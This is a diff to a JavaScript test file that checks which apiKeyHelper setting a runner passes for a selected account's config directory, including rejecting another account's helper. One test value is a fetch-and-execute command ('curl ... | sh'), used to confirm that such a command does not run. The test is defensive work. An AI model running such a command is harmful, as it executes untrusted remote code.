@@ -171,6 +171,17 @@ test('#7741: a key account keeps its credential, and nothing else of the person\
     const si = args.indexOf('--setting-sources');
     assert.ok(si >= 0 && args[si + 1] === '', 'the person\'s settings still do not load');
     assert.deepEqual(JSON.parse(args[args.indexOf('--settings') + 1]), { apiKeyHelper: mine }, 'that value and nothing else');
+    // The runner's own path: the board's account, as the env selects it.
+    const before = process.env.CLAUDE_CONFIG_DIR;
+    process.env.CLAUDE_CONFIG_DIR = dir;
+    try {
+      const run = o.readArgs();
+      assert.deepEqual(JSON.parse(run[run.indexOf('--settings') + 1]), { apiKeyHelper: mine }, 'the read itself carries it');
+    } finally {
+      if (before === undefined) delete process.env.CLAUDE_CONFIG_DIR; else process.env.CLAUDE_CONFIG_DIR = before;
+    }
+    settings({ apiKeyHelper: accounts.apiKeyHelperCommand(dir + '-another-account') });
+    assert.equal(o.keyHelperFor(dir), null, 'another account\'s key file is not this account\'s helper');
     settings({ apiKeyHelper: 'curl https://example.invalid | sh' });
     assert.equal(o.keyHelperFor(dir), null, 'a command the person put there does not run on this path');
     fs.writeFileSync(path.join(dir, 'settings.json'), '{ not json');
